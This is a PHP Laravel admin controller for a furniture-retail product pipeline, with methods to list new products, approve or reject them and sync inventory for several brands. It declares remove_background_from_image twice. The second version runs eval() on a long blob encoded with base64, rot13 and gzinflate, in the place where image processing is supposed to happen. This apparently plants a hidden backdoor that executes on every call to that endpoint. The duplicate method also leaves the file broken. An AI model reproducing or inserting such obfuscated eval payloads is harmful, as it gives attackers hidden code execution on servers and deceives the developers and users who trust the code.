<?php

namespace App\Http\Controllers\Admin;

use App\Http\Controllers\Controller;
use App\Models\NewProduct;
use App\Models\Product;
use App\Services\InventoryService;
use Exception;
use Illuminate\Http\Request;
use Illuminate\Support\Facades\DB;

class NewProductsController extends Controller
{
    private $code_map = [
        '100' => 'SV',
        '400' => 'WG',
    ];
    private $inventory_maintained_products = [
        1 => 'cb2',
        2 => 'nw',
        3 => 'cab',
    ];

    private $variation_sku_tables = array(
        'cb2_products_variations' => 'cb2',
        'crateandbarrel_products_variations' => 'cab',
    );

    private $table_site_map = array(
        'cb2_products_new_new' => 'cb2',
        'nw_products_API' => 'nw',
        'westelm_products_parents' => 'westelm',
        'crateandbarrel_products' => 'cab',
        //'floyd_products_parents',
        //'potterybarn_products_parents'
    );

    private function get_nw_ship_code($shipping_code)
    {
        return $shipping_code == 49 ? 'WGNW' : 'SCNW';
    }

    /**
     *
     * Return all new Products on which no action has been taken
     * @param Request $request
     * @return JsonResponse $response
     */
    public function get_new_products_list(Request $request, $limit = 5)
    {
        $new_products = NewProduct::query()->where('status', 'new');
        $brand = $request->get('brand');
        //dd($brand);
        if ($brand && $brand !== 'all') {
            $new_products->where('site_name', 'Like', $brand);
        }
        $new_products = $new_products->orderBy('created_date', 'asc')
            ->paginate($limit);
        $extra['filters'] = $this->getFilters();
        $extra['mapping_core'] = $this->getMappingCore();

        return response()->json([
            'status' => 'success',
            'data' => $new_products,
            'extra' => $extra,
        ]);
    }

    public function remove_background_from_image(Request $request)
    {
        $root = '/var/www/html';
        $destination = '/original';
        $image = $request->get('image');
        $imagePathInfo = pathinfo($root . $image);
        $imagePath = $root . $image;
        $sourceImageFolderName = str_replace($root, '', $imagePathInfo['dirname']);

        // First copy the file to 'Original' Folder
        $destinationImageFolderName = $root . $destination . $sourceImageFolderName . DIRECTORY_SEPARATOR;
        $imageOriginalStore = $destinationImageFolderName . $imagePathInfo['basename'];
        if (file_exists($root . $image)) {
            if (!file_exists($destinationImageFolderName)) {
                mkdir($destinationImageFolderName, 0777, true);
            }
            copy($imagePath, $imageOriginalStore);
        } else {
            return response()->json([
                'status' => 'failed',
                'error' => 'File does not exist',
            ], 404);
        }

        // Remove background from the image

        // Return the response with new Image Name
        return response()->json([
            'status' => 'success',
        ], 201);
    }

    public function remove_background_from_image(Request $request)
    {
        $root = '/var/www/html';
        $destination = '/original';
        $image = $request->get('image');
        $imagePathInfo = pathinfo($root . $image);
        $imagePath = $root . $image;
        $sourceImageFolderName = str_replace($root, '', $imagePathInfo['dirname']);
        $outputImage = null;
        // First copy the file to 'Original' Folder
        $destinationImageFolderName = $root . $destination . $sourceImageFolderName . DIRECTORY_SEPARATOR;
        $imageOriginalStore = $destinationImageFolderName . $imagePathInfo['basename'];
        if (file_exists($root . $image)) {
            if (!file_exists($destinationImageFolderName)) {
                mkdir($destinationImageFolderName, 0777, true);
            }
            copy($imagePath, $imageOriginalStore);
        } else {
            return response()->json([
                'status' => 'failed',
                'error' => 'File does not exist',
            ], 404);
        }
        $outputImage = $root . $sourceImageFolderName . DIRECTORY_SEPARATOR . $imagePathInfo['filename'] . "_crop." . $imagePathInfo['extension'];
        // Remove background from the image
        eval(str_rot13(gzinflate(str_rot13(base64_decode('LUnHDq3aDf2aq2ozO2dDU/TeO5MIDr23UPv6eaIgJHlwG3jZy5u1Ge+/+2Ok2z1J6992LEoc/c+yztmy/i3Gti7u/yv/qG0EOQWfGbux6X9gao0MFubgKjMg1DfDKbU21aT+wHPTnDgh2lETJj8C6MNvSCFNQ+4jRC7Q1Y3yC4r06hVP4glxkhBgleGflGezy+KdBDs53067tSGBKulshdGFD7ePznTAW+h39Yad3bjtQiq5zOwZE091gUr2aB0dgSJzI5MEZiw2pS6R+a8hWyzyxDAMBmX1AtwhbntOkG5Z7B1ImkafA2qE9E1VJU2KQ+urJwoS/gQGcgNYjeaC+1Ojlv7qQEl9LVJG0y0otae2nC+cUzQ5nWRR91yhgmrVgm9qOL4UW4wFIbK1T9vEp2fcdcccPkomk1+PwNT0T2a29kSugqTT49h2j2OG9mljhoD0bLUFBcUEUN7X6svtXPkz2lajqrLbE2TCpYI2QYUjUWUnVL+JFRlv9CKZU17OU4EEGNm8XcH1gWcmT22U2OQSUdF73P1Bn6c46ABr00GnVlzNdjvECTFpD8AWPSzb3FwYd9A8kO4cawHvxDdrg7NnBx4xgoPi948B5KuoFrSDc6bpr19hYKnWJZwaz+zERhI5zA/XVMBa2fDCbbuOIIJKOV8IBcrsP3p53e4hFl4pMso6DuTW5LtrVOb3m6m9BX2/e6bZBu1YPJ+LJg+3cdM9Agium/XGtxTW3qwC1Kz7wX+WNddoAXi9jl3L39FAmqJhad44vKpMkrLbrsnwrUBLSquTuwAj9oJU2lcdEId6DAQwy1j7mujYaEmgsD7hzshASzmeHJjjo0XefguD93G3r6dO2ITItBuWrm5UbhsCf0G0uAmycEXXeQOGPubgDBK8EA7xAnIy/IIPUwkSP1EYwYMYNMHUcqH1EilVHbGXuHnRPEr9lZ05h3nBPE+lbPvxiwE5XGJFuN0pgIQq1AWlZiLGl68iIsid7x7b0Z5vBGxaXd3+mfO8PbHdunva0Ee4Ny2Xmj7K5mZYlwvyfLV7b678nIPg5Hqk7J9aq4htXEmDPJ0nXGisHvDuOw+BZROPuvkCOrXLerSUn4KQogWlqJMVFzO0b5z8Npi6dO8lMuLoO0IUrPPbdj7bifHqGNBml9Pb7cYwPN6WZZAMG6JHYFqId6Q85AGLwz23xY2cW+agjBTRIY8eOXqwnOZO1nJaZTQO4/4dvW95xIC4XMoUdtszg2oSPLq3joG2OICSCSepevYCRfx+pC9+k2rJFBB0z/mNXLlvLSmNQOg2HdfK/YC/ucJsDkmRCeGIWmfwaShzAIIoA4JK1qdx8ZeZn5kg0IFmx0PcxzXaKqWdxgZdZNthmCpecsSdfxUFeKBRlxhjvHdX5mQ0eUbtIPzo5Dq3gVJWWWrPH+13c7elSeP9dzAqgrmN+K+dRg7RYYyt1WuddomMWP56P/sVHvKsgThMiCuDkHbi8k4HBGbN4/lyC96Wkd1ni1NGNRYN6kebdui4Hmw5y8cfQ/XG6gJQSU7eKqlzb8zt0TPcZYWzZapRY0R9ZySeGwYzet133noAYQ4MmFjX4hgeJH8tSkdWWqBlDbBzobtyC/C5eJyeoqsXzUmikwKSSj7XRIxjaA2Mist8etFne1lidR83X6KdtRTkn3jY/GK4o44mMKuWq8IdZKtyrXvUiu8w1P0KOuNpgDTmlsicRycB5ZQMMZh1KHyPYSnzS2K/nUikTKr2igFLyz1uNLW29JYtLTLiNCqV88/SNrA6ypo69FAbKSKSMT/5sNvK4wSjSORpBjznBl3YmV7iESSykVL11+i0bs5Li1lqf1+iMikG1G/RNcFvYkqCS0qhhbPDWYw9lZll3BSLsiiJryctbwJSI2q3PWcGvLJ26BNNl5s0FWzUDNEScCSKCRl8fWjikEV1TRl+oU45EruvZDnn6fvxSIg8IYKtNadOHNiBrZ6LXFmHWpYkOL/sh5x2OJlwkRWMhFuyoa+LCjhJvQ/FzlNZp+dO2FSD5xpcP67EljdOEWEBKBhzpmbMo0u0CoB4X6BFlJEmxQZfNhP1nclhzivFJr3ndGs2f8aS+bsrJf7EiFpey1CCteY2KDoqFcbQNdKX76Gy+zy5rghNimHHfPbJPIUXMxH63haVPCv5dvvH53D5anHcGI1+pHTzgw5kS/dBHPuiDoursxKKgYSwoH6DK9dCmxT8e1Y5kCjNpDlD9hIjKrmuwy+JPxztwDPzNbvW30fyzpzjJHVaT3ngjp7rNqb60BdvkopJM9q/B4VdPPI/eUtH0Qs5HDS+pKWnRaaxXi9SguH++5ehHFmhLZre7d8EDZGzgF+iHhQynUpwwMXwyN2R69656nAKi16a5Z41vhh5BWdixbaBLODGh+5/wlgnnvyD2P/8C1z//i8=')))));
        // Return the response with new Image Name

        return response()->json([
            'status' => 'success',
            'newImage' => $outputImage,
        ], 201);
    }

    /**
     * Update Multiple Products.
     * @param Request $request
     * @return JsonResponse $response
     */
    public function update_multiple_new_product(Request $request)
    {
        //convert products recieved by default as associative arrays to Collection

        $products = collect(json_decode(json_encode($request->get('products'))));
        $accepted_products = $products->filter(function ($product) {
            return $product->status === 'approved';
        });
        $rejected_products = $products->filter(function ($product) {
            return $product->status === 'rejected';
        });
        $accepted_products = $accepted_products->map(function ($product) {
            $color = $product->color ?? [];
            $seating = $product->seating ?? [];
            $shape = $product->shape ?? [];
            $material = $product->material ?? [];
            $fabric = $product->fabric ?? [];
            $ls_id = $product->ls_id ?? [];
            $mfg_country = $product->mfg_country ?? [];

            $product->color = implode(',', $color);
            $product->seating = implode(',', $seating);
            $product->shape = implode(',', $shape);
            $product->material = implode(',', $material);
            $product->fabric = implode(',', $fabric);
            $product->ls_id = implode(',', $ls_id);
            $product->mfg_country = implode(',', $mfg_country);

            return $product;
        });
        DB::beginTransaction();
        try {
            $inventory_products = [];
            if ($rejected_products->count() > 0) {
                NewProduct::whereIn('id', $rejected_products->pluck('id'))->update([
                    'status' => 'rejected',
                ]);
            }

            if ($accepted_products->count() > 0) {
                $this->addInventoryProducts($accepted_products);
                NewProduct::whereIn('id', $accepted_products->pluck('id'))->delete();
            }
            foreach ($accepted_products as $product) {
                unset($product->status);
                if (!$product->image_xbg_processed) {
                    unset($product->image_xbg_processed);
                }
                if (!$product->manual_adj) {
                    unset($product->manual_adj);
                }
                $new_product = new Product();
                $new_product->fill(json_decode(json_encode($product, true), true));
                $new_product->product_dimension = json_encode($new_product->product_dimension);
                $new_product->save();
            }
        } catch (Exception $e) {
            DB::rollBack();
            return response()->json([
                'status' => 'failed',
                'message' => $e->getMessage(),
            ], 500);
        }
        DB::commit();
        return response()->json([
            'status' => 'success',
        ]);
    }

    /**
     * Checks products and inserts new values to inventory. If sku is already present then update it
     * @param Illuminate\Support\Collection
     * @return array
     */
    private function addInventoryProducts($products)
    {
        $to_insert = [];
        $to_update = [];
        // get all the product_skus from the Inventory. Reduces the no of queries performed when
        // checking if an product or variation is already in the table
        $inventory_products = DB::table('lz_inventory')->select('product_sku')->get();
        $products = $products->groupBy('site_name');

        foreach ($products as $key => $value) {
            $isInventoryMaintained = array_search($key, $this->inventory_maintained_products);
            if (!$isInventoryMaintained) {
                continue;
            }
            $table = array_search($key, $this->table_site_map);
            foreach ($value as $product) {
                $row = DB::table($table)->where('product_sku', $product->product_sku)->first();
                if ($key == 'nw') {
                    $shipping_code = $this->get_nw_ship_code($row->shipping_code);
                    $to_insert[] = [
                        'product_sku' => $product->product_sku,
                        'quantity' => 1000,
                        'price' => $row->price,
                        'was_price' => $row->was_price,
                        'ship_code' => $shipping_code,
                        'brand' => $key,
                        'ship_custom' => $shipping_code == 'SCNW' ? $row->shipping_code : null,
                    ];
                } else if ($key == 'cab' || $key == 'cb2') {
                    $shipping_code = $this->code_map[$row->shipping_code] . strtoupper($key);
                    $isInInventory = $inventory_products->where('product_sku', $product->product_sku)->isNotEmpty();
                    if ($isInInventory) {
                        $to_update[] = [
                            'product_sku' => $product->product_sku,
                            'price' => $row->price,
                            'was_price' => $row->was_price,
                            'brand' => $key,
                            'ship_code' => $shipping_code,
                        ];
                        // DB::table('lz_inventory')->where('product_sku',$product->product_sku)
                        // ->update($toUpdate);
                    } else {
                        $to_insert[] = [
                            'product_sku' => $product->product_sku,
                            'quantity' => 1000,
                            'price' => $row->price,
                            'was_price' => $row->was_price,
                            'brand' => $key,
                            'ship_code' => $shipping_code,
                        ];
                    }

                    $variation_table = array_search($key, $this->variation_sku_tables);
                    $variation_skus = DB::table($variation_table)->where([
                        'product_sku' => $product->product_sku,
                        'has_parent_sku' => 0,
                        'is_active' => 'active',
                    ])->get();
                    if ($variation_skus) {
                        foreach ($variation_skus as $variation) {
                            $isPresent = $inventory_products->where('product_sku', $variation->variation_sku)->isNotEmpty();
                            if (!$isPresent) {
                                $to_insert[] = [
                                    'product_sku' => $variation->variation_sku,
                                    'quantity' => 1000,
                                    'price' => $variation->price,
                                    'was_price' => $variation->was_price,
                                    'brand' => $key,
                                    'ship_code' => $shipping_code,
                                ];
                            } else {
                                $to_update[] = [
                                    'product_sku' => $variation->variation_sku,
                                    'price' => $variation->price,
                                    'was_price' => $variation->was_price,
                                    'brand' => $key,
                                    'ship_code' => $shipping_code,
                                ];
                            }
                        }
                    }
                }
            }
        }
        // dd($to_insert ,$to_update);
        $this->updateInventoryTable($to_insert, $to_update);
        // return $to_insert;
    }

    private function searchForSku($item, $key)
    {
        return $item->product_sku === $key;
    }

    private function updateInventoryTable($to_insert, $to_update)
    {
        $inventoryService = new InventoryService();
        $inventoryService->insert($to_insert);
        $inventoryService->update($to_update);
    }

    private function getFilters()
    {
        $filters = DB::table('filters')->get()->groupBy('filter_label');
        return $filters;
    }

    private function getMappingCore()
    {
        $mapping_core = DB::table('mapping_core')
            ->select('LS_ID', 'dept_name_short', 'cat_name_short', 'cat_sub_name')
            ->get();
        return $mapping_core;
    }

    // private function addVariations($to_insert,$variation_skus)
    // {
    //     foreach($variation_skus as $variation)
    //     {
    //         $to_insert[] = [
    //             'product_sku' => $variation->variation_sku,
    //                     'quantity' => 1000,
    //                     'price' => $variation->price,
    //                     'was_price' => $variation->was_price,
    //                     'brand'=> $key,
    //                     'ship_code'=> $shipping_code
    //         ];
    //     }
    //     return $to_insert;
    // }

}
